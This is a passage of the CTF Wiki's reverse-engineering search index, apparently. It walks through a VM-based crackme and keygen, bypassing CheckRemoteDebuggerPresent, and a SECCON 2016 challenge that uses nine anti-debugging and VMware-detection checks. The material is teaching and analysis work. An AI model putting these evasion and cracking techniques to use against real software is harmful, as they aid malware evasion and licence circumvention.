and `7`, and `ecx` is a string. Length, so we can know that the input requirements here are: *inputName and inputKey are not less than 7* When the lengths of `inputName` and `inputKey` are not less than 7, then you can make a simple transformation on the input. Here is a loop ```c i = 0; do { inputName[i] ^= i; ++i; } while ( i <= *(_DWORD *)&lenOfName ); The corresponding python code is def obfuscate ( username ): s = \"\" for i in range ( len ( username )): s += chr ( ord ( username [ i ]) ^ i ) return s After the function is assigned to some variables (these are not important, just ignore it.)","title":"Get user input"},{"location":"reverse/vm/vm/#registering-seh","text":"` asm .text:004012B5 push offset seh_handler .text:004012BA push large dword ptr fs:0 .text:004012C1 mov large fs:0, esp .text:004012C8 call initVM .text:004012CD int 3 ; Trap to Debugger `initVM` is done by some virtual machine initialization before starting (in fact, it is the initial value of some registers and related parts), we will discuss later. Here we are concerned about the SEH part. Here is registered a SEH handle, exception I renamed the handler to `seh_handler` and then manually triggered the exception using `int 3`. In the `seh_handler` location, IDA did not correctly identify the corresponding code. .text:004012D7 seh_handler db 64h ; DATA XREF: process_input+7D\u0018o .text:004012D8 dd 58Fh, 0C4830000h, 13066804h, 0FF640040h, 35h, 25896400h .text:004012D8 dd 0 .text:004012F4 dd 1B8h, 0F7C93300h, 0F7C033F1h, 0FFC483E1h, 8F64FDEBh .text:004012F4 dd 5, 4C48300h, 40133068h, 35FF6400h, 0 .text:0040131C dd 258964h, 33000000h, 33198BC9h, 83E1F7C0h, 0FDEBFFC4h .text:0040131C dd 58F64h, 83000000h, 5E6804C4h, 64004013h, 35FFh, 89640000h .text:0040131C dd 25h, 0C033CC00h, 0C483E1F7h, 83FDEBFFh, 4035FF05h, 0D8B0200h .text:0040131C dd 4035FFh, 3000B1FFh, 58F0040h, 4031C8h, 31C83D80h, 750A0040h .text:0040131C dd 0B1FF4176h, 403000h, 31C8058Fh, 3D800040h, 4031C8h We can click the corresponding position and press the `c` key to convert the data into code for identification. (We need to press the c key multiple times to convert), and get the following code. As follows, in the `seh_handler` position, a similar method is used to register an exception handler located at `401306h`, and a `x0 ecx, ecx; div ecx` is manually triggered by a `divide 0 exception`. and at `loc_401301 `Location, this is an anti-debugging trick, `jmp loc_401301+2` will cause `EIP` to turn to the middle of an instruction, making it impossible to continue debugging. So we can remove the `nop` of the `00401301~00401306` part, then `00401306`Location creates a new function `seh_handler2` seh_handler: ; DATA XREF: process_input+7D\u0018o .text:004012D7 pop large dword ptr fs:0 .text:004012DE add esp, 4 .text:004012E1 push 401306h .text:004012E6 push large dword ptr fs:0 .text:004012ED mov large fs:0, esp .text:004012F4 mov eax, 1 .text: 004012F9 xor ecx, ecx .text: 004012FB div ecx .text:004012FD xor eax, eax .text: 004012FF mul ecx .text:00401301 .text:00401301 loc_401301: ; CODE XREF: .text:00401304\u0019j .text:00401301 add esp, 0FFFFFFFFh .text:00401304 jmp short near ptr loc_401301+2 .text:00401306 ; --------------------------------------------------------------------------- .text:00401306 pop large dword ptr fs:0 .text:0040130D add esp, 4 .text:00401310 push 401330h .text:00401315 push large dword ptr fs:0 .text:0040131C mov large fs:0, esp .text: 00401323 xor ecx, ecx .text: 00401325 mov ebx, [ecx] .text:00401327 xor eax, eax .text:00401329 mul ecx Similarly, `401330h` is renamed to `seh_handler3`, and `40135Eh` is the last registered exception handler. We can speculate that this is the real main function of the virtual machine, so we renamed `40135Eh` to `vm_main`. (For the SEH and anti-debugging part, you can recommend yourself to go to the dynamic debugging to figure out) ## Restore stack balance We created a `vm_main` function (you need to create a function after renaming, IDA can recognize it), then press `F5` to prompt the failure. The reason for the failure is due to the stack imbalance. So we can click on the IDA menu item. `Options-&gt;General` check the `stack pointer` on the right side. This will display the corresponding stack pointer. .text:004017F2 000 jmp vm_main .text:004017F7 ; --------------------------------------------------------------------------- .text:004017F7 000 push 0 ; uType .text:004017F9 004 push offset aError ; \"Error\" .text:004017FE 008 push offset Text ; \"The key is wrong.\" .text:00401803 00C push 0 ; hWnd .text:00401805 010 call MessageBoxA .text:0040180A .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text:0040180A 000 leave .text:0040180B -04 leave .text:0040180C -08 leave .text:0040180D -0C leave .text:0040180E -10 leave .text:0040180F -14 leave .text:00401810 -18 leave .text: 00401811 -1C retn .text:00401811 vm_main endp ; sp-analysis failed We come to the bottom to show the unbalanced position. The top `jmp vm_main` indicates that the virtual machine is executing a loop internally. The call to `MessageBoxA` is to display the last pop-up error message. At the location of `locret_40180A`, after much The leave stack is heavily unbalanced, so we need to manually restore the stack balance. It&#39;s also very simple. The `0040180A` position has been stack balanced (000), so we only need to change the `leave` to `retn`. .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text: 0040180A 000 retn .text:0040180B ; --------------------------------------------------------------------------- .text:0040180B 004 leave .text:0040180C 004 leave .text:0040180D 004 leave Then you can find that `vm_main` can generate pseudo C code in F5. ## Virtual machine instruction analysis To be honest, the analysis part of the virtual machine is a relatively tedious restore process. You need to compare the operations of each small part to determine what kind of instruction is this, which registers are used. Like this crackme, vm is a `Fetch-decode-execute` loop. The `decode` procedure gives us the most information. Different instructions are here, according to their respective `opcode`, using the `if-else if-else` branch. Differentiate. The actual restore process is not complicated, but it may be tedious because of the number of instructions implemented by the virtual machine. The final analysis results are as follows: | opcode | value | | ------ | ----- | | push | 0x0a | | pop | 0x0b | | mov | 0x0c | | cmp | 0x0d | | inc | 0x0e | | dec | 0x0f | | and | 0x1b | | or | 0x1c | | chorus 0x1d | | check | 0xff | Let&#39;s look at the analyzed `initVM` function. ```c int initVM() { int result; // eax@1 r1 = 0; r2 = 0; r3 = 0; result = (unsigned __int8)inputName[(unsigned __int8)cur_index]; r4 = (unsigned __int8)inputName[(unsigned __int8)cur_index]; vm_sp = 0x32; vm_pc = 0; vm_flags_zf = 0; vm_flags_sf = 0; ++ cur_index; return result; } There are 4 general-purpose registers ( r1/r2/r3/r4 ), 1 sp pointer and 1 pc pointer, flags zf and sf . var_a which we did not know before. It is renamed to cur_index , which points to the character index currently being processed by inputName . We will not say more about the multiple instructions implemented by the VM. Let's focus on the operation of the check part. int __fastcall check ( int a1 ) { char v1 ; // al @ 1 int result ; // eax@4 v1 = r1 ; if ( ( unsigned __int8 ) r1 < 0x21u ) v1 = r1 + 0x21 ; LOBYTE ( a1 ) = cur_index ; if ( v1 == inputKey [ a1 ]) { if ( ( unsigned __int8 ) cur_index >= ( unsigned __int8 ) lenOfName ) result = MessageBoxA ( 0 , aGoodJobNowWrit , Caption , 0 ); else result = initVM (); } else { result = MessageBoxA ( 0 , Text , Caption , 0 ); } return result ; } If the value in r1 is equal to inputKey[cur_index] , then it will continue to determine whether the entire inputName has been checked. If there is no error and the comparison ends, then Good job! Now write a keygen. Message box. Otherwise it will continue to initVM to enter the next round of loops. (Of course, the pop-up message box prompts an error.) cur_index will increment by 1 in initVM , then remember to execute initVM twice in process_input . Because there are 2 times initVM , so the first 2 of our inputKey Can be any character. unk_4031CE = i ; opcode = vm_pc ; initVM (); initVM (); __debugbreak (); JUMPOUT ( * ( _DWORD * ) & word_4012CE ); So after we analyzed the entire virtual machine, we can start writing Keygen . The corresponding keygenme can be downloaded here: fuelvm_keygen.py $ python2 fuelvm_keygen.py ctf-wiki [ * ] Password for user 'ctf-wiki' is: 4mRC*TKJI The corresponding IDA database can be downloaded here: FuelVM.idb","title":"Registering SEH"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/","text":"About CheckRemoteDebuggerPresent \u00b6 The CheckRemoteDebuggerPresent() function of kernel32 is used to detect if the specified process is being debugged. Remote refers to a different process in the same machine. BOOL WINAPI CheckRemoteDebuggerPresent ( _In_ HANDLE hProcess , _Inout_ PBOOL pbDebuggerPresent ); If the debugger exists (usually to detect if it is being debugged), the function will set the value pointed to by pbDebuggerPresent to 0xffffffff . Detection code \u00b6 The 32-bit environment can be detected with the following 32-bit code ` asm push eax push esp push -1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent pop eax test eax, eax jne being_debugged Or 64-bit code to detect 64-bit environments `` `asm enter 20h, 0 mov edx, ebp or rcx, -1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent leave test ebp, ebp jne being_debugged How to bypass \u00b6 For example, there is the following code int main ( int argc , char * argv []) { BOOL isDebuggerPresent = FALSE ; if ( CheckRemoteDebuggerPresent ( GetCurrentProcess (), & isDebuggerPresent )) { if ( isDebuggerPresent ) { std :: cout << \"Stop debugging program!\" << std :: endl ; exit ( -1 ); } } return 0 ; } We can directly modify the value of isDebuggerPresent or modify the jump condition to bypass (note that izhi is not CheckRemoteDebuggerPresent , its return value is used to indicate whether the function is executed correctly). But if you want to modify the api function of CheckRemoteDebuggerPresent . First of all, you need to know that CheckRemoteDebuggerPresent internally does the function by calling NtQueryInformationProcess . And we need to modify the return value of NtQueryInformationProcess . We will be [NtQueryInformationProcess] (./ntqueryinformationprocess/index.html) for introduction.","title":"CheckRemoteDebuggerPresent"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/#about-checkremotedebuggerpresent","text":"The CheckRemoteDebuggerPresent() function of kernel32 is used to detect if the specified process is being debugged. Remote refers to a different process in the same machine. BOOL WINAPI CheckRemoteDebuggerPresent ( _In_ HANDLE hProcess , _Inout_ PBOOL pbDebuggerPresent ); If the debugger exists (usually to detect if it is being debugged), the function will set the value pointed to by pbDebuggerPresent to 0xffffffff .","title":"About CheckRemoteDebuggerPresent"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/#detection-code","text":"The 32-bit environment can be detected with the following 32-bit code ` asm push eax push esp push -1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent pop eax test eax, eax jne being_debugged Or 64-bit code to detect 64-bit environments `` `asm enter 20h, 0 mov edx, ebp or rcx, -1 ;GetCurrentProcess() call CheckRemoteDebuggerPresent leave test ebp, ebp jne being_debugged","title":"Detection code"},{"location":"reverse/windows/anti-debug/checkremotedebuggerpresent/#how-to-bypass","text":"For example, there is the following code int main ( int argc , char * argv []) { BOOL isDebuggerPresent = FALSE ; if ( CheckRemoteDebuggerPresent ( GetCurrentProcess (), & isDebuggerPresent )) { if ( isDebuggerPresent ) { std :: cout << \"Stop debugging program!\" << std :: endl ; exit ( -1 ); } } return 0 ; } We can directly modify the value of isDebuggerPresent or modify the jump condition to bypass (note that izhi is not CheckRemoteDebuggerPresent , its return value is used to indicate whether the function is executed correctly). But if you want to modify the api function of CheckRemoteDebuggerPresent . First of all, you need to know that CheckRemoteDebuggerPresent internally does the function by calling NtQueryInformationProcess . And we need to modify the return value of NtQueryInformationProcess . We will be [NtQueryInformationProcess] (./ntqueryinformationprocess/index.html) for introduction.","title":"How to bypass"},{"location":"reverse/windows/anti-debug/example/","text":"Let's analyze a 2016 anti-debugging problem for SecCon, title download link: bin.exe This is a 32-bit PE file. It is a console program. We run it directly and will ask for password . When you type a wrong password , you will be prompted password is wrong . We use IDA to open it. The quickest way is to look at the string directly and find the key code according to password is wrong . The result shown by IDA is as follows: ! [ida_strings.png] (./ figure / 2016_seccon / ida_strings.png) Obviously, the string indicates that there may be various tests in the program, such as detecting the process names ollydbg.exe , ImmunityDebugger.exe , idaq.exe and Wireshark.exe . Then there are other tests. We also see I got the words password is wrong and You password is correct . I also found a string that is likely to be the flag to be decrypted. Then we will first come to the cross reference of password is wrong Key function. As shown below: The program uses a lot of anti-debugging techniques. int __cdecl main ( int argc , const char ** argv , const char ** envp ) { v23 = 0 ; memset ( & v24 , 0 , 0x3Fu ); v22 = 1 ; printf ( \"Input password >\" ); v3 = ( FILE * ) sub_40223D (); fgets ( & v23 , 64 , v3 ); strcpy ( v21 , \"I have a pen.\" ); V22 = strncmp ( & amp ; v23 , v21 , 0xDu ); // 1. Compare plaintext strings with input strings directly if ( ! v22 ) { puts ( \"Your password is correct.\" ); if ( IsDebuggerPresent () == 1 ) // 2. API: IsDebuggerPresent() { puts ( \"But detected debugger!\" ); exit ( 1 ); } If ( sub_401120 () == 0x70 ) // 3. Check if the 0x68 offset of the PEB is 0x70. Detect NtGlobalFlag() { puts ( \"But detected NtGlobalFlag!\" ); exit ( 1 ); } /* BOOL WINAPI CheckRemoteDebuggerPresent( * _In_ HANDLE hProcess, * _Inout_ PBOOL pbDebuggerPresent * ); */ v4 = GetCurrentProcess (); CheckRemoteDebuggerPresent ( v4 , & amp ; pbDebuggerPresent ); if ( pbDebuggerPresent ) // 4. API: CheckRemoteDebuggerPresent() { printf ( \"But detected remotedebug. \\n \" ); exit ( 1 ); } v13 = GetTickCount (); for ( i = 0 ; i == 100 ; ++ i ) Sleep ( 1u ); v16 = 1000 ; If ( GetTickCount () - v13 & gt ; 1000 ) // 5. Detect time difference { printf ( \"But detected debug. \\n \" ); exit ( 1 ); } lpFileName = \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" ; if ( CreateFileA ( \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" , 0x80000000 , 7u , 0 , 3u , 0x80u , 0 ) != ( HANDLE ) -1 ) { printf ( \"But detect %s. \\n \" , & lpFileName ); // 6. \u68c0\u6d4bProcessMonitor exit ( 1 ); } V11 = sub_401130 (); // 7. API: CreateToolhelp32Snapshot() detects the process if ( v11 == 1 ) { printf ( \"But detected Ollydbg. \\n \" ); exit ( 1 ); } if ( v11 == 2 ) { printf ( \"But detected ImmunityDebugger. \\n \" ); exit ( 1 ); } if ( v11 == 3 ) { printf ( \"But detected IDA. \\n \" ); exit ( 1 ); } if ( v11 == 4 ) { printf ( \"But detected WireShark. \\n \" ); exit ( 1 ); } If ( sub_401240 () == 1 ) // 8. Detect through the i/O port of vmware { printf ( \"But detected VMware. \\n \" ); exit ( 1 ); } v17 = 1 ; v20 = 1 ; v12 = 0 ; v19 = 1 / 0 ; ms_exc . registration . TryLevel = -2 ; // 9. SEH printf ( \"But detected Debugged. \\n \" ); exit ( 1 ); } printf ( \"password is wrong. \\n \" ); return 0 ; } I wrote a note in the code that lists the 9 protection techniques used in it. Let's analyze it one by one. Compare plaintext strings \u00b6 printf ( \"Input password >\" ); v3 = ( FILE * ) sub_40223D (); fgets ( & v23 , 64 , v3 ); strcpy ( v21 , \"I have a pen.\" ); V22 = strncmp ( & amp ; v23 , v21 , 0xDu ); // 1. Compare plaintext strings with input strings directly if ( ! v22 ) { ...... } Here is the output Input password &gt; . Then use fgets() to get the string entered by the user, copy I have a pen. to the buffer of v21 , and compare the user input with strncmp With the contents of I have a pen. , and return the comparison result to v22 . The following will be based on v22 , that is, according to whether the input password is correct, and jump. IsDebuggerPresent() \u00b6 puts ( \"Your password is correct.\" ); if ( IsDebuggerPresent () == 1 ) // 2. API: IsDebuggerPresent() { puts ( \"But detected debugger!\" ); exit ( 1 ); } Obviously, if the input password is correct, it will output the prompt Your password is correct. . ??? Not surprising. Is it I have a pen. is our flag? No, no, of course not. This is actually a trap. Since you know I have a pen. then there is definitely some way to analyze the program through some reverse means. So the next part will start some anti-debugging or other means of detection (actual Such a trap can also occur in the middle). At the beginning is IsDebuggerPresent() , which determines if there is debugging based on the returned result. If you are not sure, you can go back and look at IsDebuggerPresent() NtGlobalFlag \u00b6 Next is to detect the flag of the NtGlobalFlag field. Detect the debugger by checking if the field value of the PEB is 0x70 . If it is not clear, you can go back and look at NtGlobalFlag If ( sub_401120 () == 0x70 ) // 3. Check if the 0x68 offset of the PEB is 0x70. Detect NtGlobalFlag() { puts ( \"But detected NtGlobalFlag!\" ); exit ( 1 ); } Then let's take a quick look at sub_401120() . int sub_401120 () { return * ( _DWORD * )( __readfsdword ( 48 ) + 0x68 ) & 0x70 ; } 0x68 is the offset value of the NtGlobalFlag field of the PEB. 0x70 is the three flags of FLG_HEAP_ENABLE_TAIL_CHECK (0x10) , FLG_HEAP_ENABLE_FREE_CHECK (0x20) and FLG_HEAP_VALIDATE_PARAMETERS (0x40) CheckRemoteDebuggerPresent \u00b6 /* BOOL WINAPI CheckRemoteDebuggerPresent( * _In_ HANDLE hProcess, * _Inout_ PBOOL pbDebuggerPresent * ); */ v4 = GetCurrentProcess (); CheckRemoteDebuggerPresent ( v4 , & amp ; pbDebuggerPresent ); if ( pbDebuggerPresent ) // 4. API: CheckRemoteDebuggerPresent() { printf ( \"But detected remotedebug. \\n \" ); exit ( 1 ); } Here I will list the function prototype of the CheckRemoteDebuggerPresent() API in the comments. If the debugger is detected, pbDebuggerPresent will be set to a non-zero value. Detect the debugger based on its value ( CheckRemoteDebuggerPresent( ) Time difference detection \u00b6 v13 = GetTickCount (); for ( i = 0 ; i == 100 ; ++ i ) // \u7761\u7720 Sleep ( 1u ); v16 = 1000 ; If ( GetTickCount () - v13 & gt ; 1000 ) // 5. Detect time difference { printf ( \"But detected debug. \\n \" ); exit ( 1 ); } GetTickCount will return the number of milliseconds from start to now. The loop is sleep(1) , which is 100 times, that is, 100 milliseconds. If the difference between the two times is greater than 1000 milliseconds, the time difference is obviously greater than the consumed time. The time, indirectly detected debugging. ProcessMonitor \u00b6 lpFileName = \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" ; if ( CreateFileA ( \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" , 0x80000000 , 7u , 0 , 3u , 0x80u , 0 ) != ( HANDLE ) -1 ) { printf ( \"But detect %s. \\n \" , & lpFileName ); // 6. \u68c0\u6d4bProcessMonitor exit ( 1 ); } Check ProcessMonitor here by checking the device file \\\\\\\\.\\\\Global\\\\ProcmonDebugLogger Detection process name \u00b6 Here, the process is detected by executing the sub_401130() function, and the corresponding value is returned according to the detected different processes. V11 = sub_401130 (); // 7. API: CreateToolhelp32Snapshot() detects the process if ( v11 == 1 ) { printf ( \"But detected Ollydbg. \\n \" ); exit ( 1 ); } if ( v11 == 2 ) { printf ( \"But detected ImmunityDebugger. \\n \" ); exit ( 1 ); } if ( v11 == 3 ) { printf ( \"But detected IDA. \\n \" ); exit ( 1 ); } if ( v11 == 4 ) { printf ( \"But detected WireShark. \\n \" ); exit ( 1 ); } Let's take a look at the sub_401130() function. signed int sub_401130 () { PROCESSENTRY32 pe ; // [sp + 0h] [bp-138h] @ 1 HANDLE hSnapshot ; // [sp+130h] [bp-8h]@1 int i ; // [sp+134h] [bp-4h]@1 pe . dwSize = 296 ; memset ( & amp ; pe . cntUsage , 0 , 0x124u ); hSnapshot = CreateToolhelp32Snapshot ( 2u , 0 ); for ( i = Process32First ( hSnapshot , & pe ); i == 1 ; i = Process32Next ( hSnapshot , & pe ) ) { if ( ! _stricmp ( pe . szExeFile , \"ollydbg.exe\" ) ) return 1 ; if ( ! _stricmp ( pe . szExeFile , & quot ; ImmunityDebugger . exe & quot ;)) return 2 ; if ( ! _stricmp ( pe . szExeFile , & quot ; idaq . exe & quot ;)) return 3 ; if ( ! _stricmp ( pe . szExeFile , & quot ; Wireshark . exe & quot ;)) return 4 ; } return 0 ; } Here the API is used: CreateToolhelp32Snapshot to get the current process information. It is compared in the for loop. If the specified process name is found, it returns the corresponding value directly. Then it jumps to a different branch according to the return value. Detecting VMware \u00b6 Testing VMware is also detecting some features. Judging based on the results of the test. If ( sub_401240 () == 1 ) // 8. Detect through the i/O port of vmware { printf ( \"But detected VMware. \\n \" ); exit ( 1 ); } Look at the sub_401240() function. signed int sub_401240 () { unsigned __int32 v0 ; // eax@1 v0 = __indword ( 0x5658u ); return 1 ; } This is a \"backdoor\" I/O port for VMware, 0x5658 = &quot;VX&quot; . If the program is running inside VMware, the program uses the In instruction to read data through the 0x5658 port, the value of the EBX register. Will become 0x564D5868 ( 0x564D5868 == &quot;VMXh&quot; ) Look at the pseudo-C code decompiled by IDA is not very intuitive to reflect this, we see the assembly code is clear ` asm .text:0040127A push edx .text:0040127B push ecx .text:0040127C push ebx .text:0040127D mov eax, 564D5868h // <------ .text:00401282 mov ebx, 0 .text: 00401287 mov ecx, 0Ah .text:0040128C mov edx, 5658h // <------ .text:00401291 in eax, dx .text:00401292 pop ebx .text:00401293 pop ecx .text:00401294 pop edx \u66f4\u591a\u9605\u8bfb: [E-cards don?t like virtual environments](https://isc.sans.edu/diary/E-cards+don%3Ft+like+virtual+environments/3190) ## SEH ``` c v17 = 1; v20 = 1; v12 = 0; v19 = 1/0; // 9 SEH ms_exc.registration.TryLevel = -2; printf(\"But detected Debugged.\\n\"); exit(1); The next paragraph, very strange is not. Here v19 = 1 / 0; obviously unreasonable, will produce a divide by zero exception. And the latter ms_exc.registration.TryLevel = -2; this is to cancel the exception , TryLevel=TRYLEVEL_NONE (-2) . Look at the assembly code. .text:004015B8 mov [ebp+var_88], 1 .text:004015C2 mov [ebp+var_7C], 1 .text:004015C9 mov [ebp+var_9C], 0 .text:004015D3 mov [ebp+ms_exc.registration.TryLevel], 0 .text:004015DA mov eax, [ebp+var_7C] .text:004015DD cdq .text:004015DE idiv [ebp+var_9C] .text:004015E4 mov [ebp+var_80], eax .text:004015E7 mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh .text:004015EE jmp short loc_40160A After the idiv [ebp+var_9C] trigger exception is taken over by the exception handler handled by the program, if the breakpoint is not set at the exception handler entry, the program will easily run away. Get flag \u00b6 But the whole look at it. How do you feel that there is nothing left in the flag? Have you remembered the string that was previously seen in the string window and is suspected to be the flag to be decrypted? Actually due to the limitation of IDA decompilation, Make the decompiled pseudo C code is not correct. For example, in the last paragraph of printf(&quot;But detected Debugged.\\n&quot;); here, let's look at the specific assembly code. ` asm .text:00401627 call sub_4012E0 .text:0040162C movzx eax, ax .text:0040162F mov [ebp+var_A8], eax .text:00401635 cmp [ebp+var_A8], 0 // <------ .text:0040163C jz short loc_401652 // <------ .text:0040163E push offset aButDetectedD_2 ; \"But detected Debugged.\\n\" .text:00401643 call _printf .text:00401648 add esp, 4 .text:0040164B push 1 ; int .text:0040164D call _exit ``` In fact, this code is not decompiled by IDA. The loc_401652 position is a string of code, the highlight is the use of a MessageBoxA function. And one of the function parameters is our flag to be decrypted. Then we After entering I have a pen. , in the assembly code section of the if ( !v22 ) jump, manually change it to jump to the flag decryption and pop up the messagebox part of the run, let the program help yourself. Decrypt and output, you can. The operation is as shown below: Here is the jump part after inputting I have a pen. , because the part that is normally jumped to is all part of the detection and debugging, so we jump directly to the part of the code decryption. That is the position of 00401663 . The mov-cmp-jnz above 00401663 is also a verification part, regardless of it, jump directly to mov ecx, 7 here 00401663 here to run the decryption code, and follow the MessageBoxA() Pop up message box, get flag","title":"Anti-debug Technical Example"},{"location":"reverse/windows/anti-debug/example/#compare-plaintext-strings","text":"printf ( \"Input password >\" ); v3 = ( FILE * ) sub_40223D (); fgets ( & v23 , 64 , v3 ); strcpy ( v21 , \"I have a pen.\" ); V22 = strncmp ( & amp ; v23 , v21 , 0xDu ); // 1. Compare plaintext strings with input strings directly if ( ! v22 ) { ...... } Here is the output Input password &gt; . Then use fgets() to get the string entered by the user, copy I have a pen. to the buffer of v21 , and compare the user input with strncmp With the contents of I have a pen. , and return the comparison result to v22 . The following will be based on v22 , that is, according to whether the input password is correct, and jump.","title":"Compare plaintext strings"},{"location":"reverse/windows/anti-debug/example/#isdebuggerpresent","text":"puts ( \"Your password is correct.\" ); if ( IsDebuggerPresent () == 1 ) // 2. API: IsDebuggerPresent() { puts ( \"But detected debugger!\" ); exit ( 1 ); } Obviously, if the input password is correct, it will output the prompt Your password is correct. . ??? Not surprising. Is it I have a pen. is our flag? No, no, of course not. This is actually a trap. Since you know I have a pen. then there is definitely some way to analyze the program through some reverse means. So the next part will start some anti-debugging or other means of detection (actual Such a trap can also occur in the middle). At the beginning is IsDebuggerPresent() , which determines if there is debugging based on the returned result. If you are not sure, you can go back and look at IsDebuggerPresent()","title":"IsDebuggerPresent()"},{"location":"reverse/windows/anti-debug/example/#ntglobalflag","text":"Next is to detect the flag of the NtGlobalFlag field. Detect the debugger by checking if the field value of the PEB is 0x70 . If it is not clear, you can go back and look at NtGlobalFlag If ( sub_401120 () == 0x70 ) // 3. Check if the 0x68 offset of the PEB is 0x70. Detect NtGlobalFlag() { puts ( \"But detected NtGlobalFlag!\" ); exit ( 1 ); } Then let's take a quick look at sub_401120() . int sub_401120 () { return * ( _DWORD * )( __readfsdword ( 48 ) + 0x68 ) & 0x70 ; } 0x68 is the offset value of the NtGlobalFlag field of the PEB. 0x70 is the three flags of FLG_HEAP_ENABLE_TAIL_CHECK (0x10) , FLG_HEAP_ENABLE_FREE_CHECK (0x20) and FLG_HEAP_VALIDATE_PARAMETERS (0x40)","title":"NtGlobalFlag"},{"location":"reverse/windows/anti-debug/example/#checkremotedebuggerpresent","text":"/* BOOL WINAPI CheckRemoteDebuggerPresent( * _In_ HANDLE hProcess, * _Inout_ PBOOL pbDebuggerPresent * ); */ v4 = GetCurrentProcess (); CheckRemoteDebuggerPresent ( v4 , & amp ; pbDebuggerPresent ); if ( pbDebuggerPresent ) // 4. API: CheckRemoteDebuggerPresent() { printf ( \"But detected remotedebug. \\n \" ); exit ( 1 ); } Here I will list the function prototype of the CheckRemoteDebuggerPresent() API in the comments. If the debugger is detected, pbDebuggerPresent will be set to a non-zero value. Detect the debugger based on its value ( CheckRemoteDebuggerPresent( )","title":"CheckRemoteDebuggerPresent"},{"location":"reverse/windows/anti-debug/example/#time-difference-detection","text":"v13 = GetTickCount (); for ( i = 0 ; i == 100 ; ++ i ) // \u7761\u7720 Sleep ( 1u ); v16 = 1000 ; If ( GetTickCount () - v13 & gt ; 1000 ) // 5. Detect time difference { printf ( \"But detected debug. \\n \" ); exit ( 1 ); } GetTickCount will return the number of milliseconds from start to now. The loop is sleep(1) , which is 100 times, that is, 100 milliseconds. If the difference between the two times is greater than 1000 milliseconds, the time difference is obviously greater than the consumed time. The time, indirectly detected debugging.","title":"Time difference detection"},{"location":"reverse/windows/anti-debug/example/#processmonitor","text":"lpFileName = \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" ; if ( CreateFileA ( \" \\\\\\\\ . \\\\ Global \\\\ ProcmonDebugLogger\" , 0x80000000 , 7u , 0 , 3u , 0x80u , 0 ) != ( HANDLE ) -1 ) { printf ( \"But detect %s. \\n \" , & lpFileName ); // 6. \u68c0\u6d4bProcessMonitor exit ( 1 ); } Check ProcessMonitor here by checking the device file \\\\\\\\.\\\\Global\\\\ProcmonDebugLogger","title":"ProcessMonitor"},{"location":"reverse/windows/anti-debug/example/#detection-process-name","text":"Here, the process is detected by executing the sub_401130() function, and the corresponding value is returned according to the detected different processes. V11 = sub_401130 (); // 7. API: CreateToolhelp32Snapshot() detects the process if ( v11 == 1 ) { printf ( \"But detected Ollydbg. \\n \" ); exit ( 1 ); } if ( v11 == 2 ) { printf ( \"But detected ImmunityDebugger. \\n \" ); exit ( 1 ); } if ( v11 == 3 ) { printf ( \"But detected IDA. \\n \" ); exit ( 1 ); } if ( v11 == 4 ) { printf ( \"But detected WireShark. \\n \" ); exit ( 1 ); } Let's take a look at the sub_401130() function. signed int sub_401130 () { PROCESSENTRY32 pe ; // [sp + 0h] [bp-138h] @ 1 HANDLE hSnapshot ; // [sp+130h] [bp-8h]@1 int i ; // [sp+134h] [bp-4h]@1 pe . dwSize = 296 ; memset ( & amp ; pe . cntUsage , 0 , 0x124u ); hSnapshot = CreateToolhelp32Snapshot ( 2u , 0 ); for ( i = Process32First ( hSnapshot , & pe ); i == 1 ; i = Process32Next ( hSnapshot , & pe ) ) { if ( ! _stricmp ( pe . szExeFile , \"ollydbg.exe\" ) ) return 1 ; if ( ! _stricmp ( pe . szExeFile , & quot ; ImmunityDebugger . exe & quot ;)) return 2 ; if ( ! _stricmp ( pe . szExeFile , & quot ; idaq . exe & quot ;)) return 3 ; if ( ! _stricmp ( pe . szExeFile , & quot ; Wireshark . exe & quot ;)) return 4 ; } return 0 ; } Here the API is used: CreateToolhelp32Snapshot to get the current process information. It is compared in the for loop. If the specified process name is found, it returns the corresponding value directly. Then it jumps to a different branch according to the return value.","title":"Detection process name"},{"location":"reverse/windows/anti-debug/example/#detecting-vmware","text":"Testing VMware is also detecting some features. Judging based on the results of the test. If ( sub_401240 () == 1 ) // 8. Detect through the i/O port of vmware { printf ( \"But detected VMware. \\n \" ); exit ( 1 ); } Look at the sub_401240() function. signed int sub_401240 () { unsigned __int32 v0 ; // eax@1 v0 = __indword ( 0x5658u ); return 1 ; } This is a \"backdoor\" I/O port for VMware, 0x5658 = &quot;VX&quot; . If the program is running inside VMware, the program uses the In instruction to read data through the 0x5658 port, the value of the EBX register. Will become 0x564D5868 ( 0x564D5868 == &quot;VMXh&quot; ) Look at the pseudo-C code decompiled by IDA is not very intuitive to reflect this, we see the assembly code is clear ` asm .text:0040127A push edx .text:0040127B push ecx .text:0040127C push ebx .text:0040127D mov eax, 564D5868h // <------ .text:00401282 mov ebx, 0 .text: 00401287 mov ecx, 0Ah .text:0040128C mov edx, 5658h // <------ .text:00401291 in eax, dx .text:00401292 pop ebx .text:00401293 pop ecx .text:00401294 pop edx \u66f4\u591a\u9605\u8bfb: [E-cards don?t like virtual environments](https://isc.sans.edu/diary/E-cards+don%3Ft+like+virtual+environments/3190) ## SEH ``` c v17 = 1; v20 = 1; v12 = 0; v19 = 1/0; // 9 SEH ms_exc.registration.TryLevel = -2; printf(\"But detected Debugged.\\n\"); exit(1); The next paragraph, very strange is not. Here v19 = 1 / 0; obviously unreasonable, will produce a divide by zero exception. And the latter ms_exc.registration.TryLevel = -2; this is to cancel the exception , TryLevel=TRYLEVEL_NONE (-2) . Look at the assembly code. .text:004015B8 mov [ebp+var_88], 1 .text:004015C2 mov [ebp+var_7C], 1 .text:004015C9 mov [ebp+var_9C], 0 .text:004015D3 mov [ebp+ms_exc.registration.TryLevel], 0 .text:004015DA mov eax, [ebp+var_7C] .text:004015DD cdq .text:004015DE idiv [ebp+var_9C] .text:004015E4 mov 